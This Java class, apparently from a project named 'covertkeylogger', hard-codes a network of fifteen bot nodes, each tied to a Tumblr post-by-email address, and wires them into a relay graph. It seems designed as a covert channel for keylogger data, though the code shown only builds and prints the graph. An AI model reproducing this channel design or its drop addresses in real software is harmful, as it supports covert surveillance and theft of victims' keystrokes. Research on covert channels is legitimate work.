package covertkeylogger;

import java.util.ArrayList;
import java.util.Arrays;

public class BotInfo {

	private ArrayList<BotInfo> connectedNodes;
	private String blogName;
	private String postEmail;

	public ArrayList<BotInfo> getConnectedNodes() {
		return connectedNodes;
	}

	public String getBlogName() {
		return blogName;
	}

	public String getPostEmail() {
		return postEmail;
	}
	
	public void setPostEmail(String postEmail) {
		this.postEmail = postEmail;
	}

	public BotInfo(String name) {

		this.blogName = name;
		// this.password = password;

	}

	public BotInfo(String name, String email) {

		this.blogName = name;
		this.postEmail = email;

	}

	public void setConnectedNodes(ArrayList<BotInfo> nodeArray) {

		this.connectedNodes = nodeArray;

	}

	public static ArrayList<BotInfo> createNetwork() {

		// Create array of initial bots...
		ArrayList<BotInfo> bots = new ArrayList<BotInfo>();

		// Add the bots
		for (int a = 1; a < 16; a++) {

			bots.add(new BotInfo("cklhaxsaw" + a));

		}
		
		//Set the post emails...
		
		bots.get(0).setPostEmail("4cvti8ntnyjou@tumblr.com");
		bots.get(1).setPostEmail("vkbu8pa8hrnte@tumblr.com");
		bots.get(2).setPostEmail("txirvgi544eam@tumblr.com");
		bots.get(3).setPostEmail("u0dbi5ynzyzpg@tumblr.com");
		bots.get(4).setPostEmail("x8f2uc0ond6qq@tumblr.com");
		bots.get(5).setPostEmail("ir9d6f8hcoaeb@tumblr.com");
		bots.get(6).setPostEmail("7iayazcacq2we@tumblr.com");
		bots.get(7).setPostEmail("sryt9sajmxssg@tumblr.com");
		bots.get(8).setPostEmail("dg5iwsdqfnxy0@tumblr.com");
		bots.get(9).setPostEmail("sq2zmdhj0e0pz@tumblr.com");
		bots.get(10).setPostEmail("ycx3qxbcigosf@tumblr.com");
		bots.get(11).setPostEmail("8ctwypq2yrpjw@tumblr.com");
		bots.get(12).setPostEmail("xzcxfqrtyoh5r@tumblr.com");
		bots.get(13).setPostEmail("59iezugszki2k@tumblr.com");
		bots.get(14).setPostEmail("aes5tnpxvqit9@tumblr.com");

		// Create a graph of edges...
		bots.get(0).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(1), bots.get(2),
						bots.get(13), bots.get(14))));
		bots.get(1).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(0), bots.get(3),
						bots.get(8))));
		bots.get(2).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(0), bots.get(4),
						bots.get(13))));
		bots.get(3).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(1), bots.get(4),
						bots.get(6))));
		bots.get(4).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(2), bots.get(3),
						bots.get(5), bots.get(6), bots.get(11))));
		bots.get(5).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(4), bots.get(6),
						bots.get(7), bots.get(12))));
		bots.get(6).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(3), bots.get(4),
						bots.get(5), bots.get(8), bots.get(10), bots.get(14))));
		bots.get(7).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(5), bots.get(8),
						bots.get(13))));
		bots.get(8).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(1), bots.get(6),
						bots.get(7), bots.get(9), bots.get(10))));
		bots.get(9).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(8), bots.get(10),
						bots.get(11))));
		bots.get(10).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(6), bots.get(8),
						bots.get(9), bots.get(12))));
		bots.get(11).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(4), bots.get(9),
						bots.get(12), bots.get(13))));
		bots.get(12).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(5), bots.get(10),
						bots.get(11), bots.get(14))));
		bots.get(13).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(0), bots.get(2),
						bots.get(7), bots.get(11), bots.get(14))));
		bots.get(14).setConnectedNodes(
				new ArrayList<BotInfo>(Arrays.asList(bots.get(6), bots.get(12),
						bots.get(13), bots.get(0))));

		return bots;

	}

	public static void verifyNetwork(ArrayList<BotInfo> graph) {

		System.out.print("Network node list:\n\n");
		System.out.print("Node\t\tAdjacent Nodes\n");

		for (BotInfo bot : graph) {

			System.out.print(bot.getBlogName() + ": \t");

			for (BotInfo adjBot : bot.connectedNodes) {

				System.out.print(adjBot.getBlogName() + ", ");
			}

			System.out.print("\n");
		}
	}
}
